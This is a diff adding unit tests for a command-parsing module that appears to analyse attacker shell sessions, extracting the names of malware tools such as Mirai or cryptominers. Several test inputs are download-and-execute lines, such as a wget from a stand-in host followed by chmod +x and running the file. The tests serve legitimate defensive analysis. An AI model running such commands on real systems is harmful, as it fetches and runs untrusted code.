@@ -1,3 +1,5 @@
+import pytest
+
 from brain.commands import (
     command_name,
     domains,
@@ -80,3 +82,21 @@ def test_chmodded_executable():
     assert chmodded_executable("chmod +x /tmp/.d") == [".d"]
     assert chmodded_executable("chmod 755 a b; chmod u+x c") == ["a", "b", "c"]
     assert chmodded_executable("chmod 644 a; chmod -x b; chmod +r c") == []
+
+
+def test_tool_names_only_programs_run_or_downloaded():
+    # named but never run as a program
+    assert tool_names("cat log | kinsing_parser; grep xmrig /tmp/log") == []
+    assert tool_names("chmod +x mirai.arm7") == ["mirai.arm7"]
+    assert tool_names("curl -o /tmp/kdevtmpfsi http://a.b/x") == ["kdevtmpfsi"]
+
+
+@pytest.mark.parametrize("line", [
+    "wget http://a.b/filter; chmod +x filter; ./filter",  # english word
+    "./update.sh", "sh install.sh", "bash setup",  # english words
+    "./source", "sh export", "./alias",  # shell builtins
+    "./netstat", "chmod +x /tmp/crontab", "./busybox",  # standard commands
+    "./x86", "sh a.sh", "./kd",  # under 4 characters
+])
+def test_tool_names_skip_generic_names(line):
+    assert tool_names(line) == []
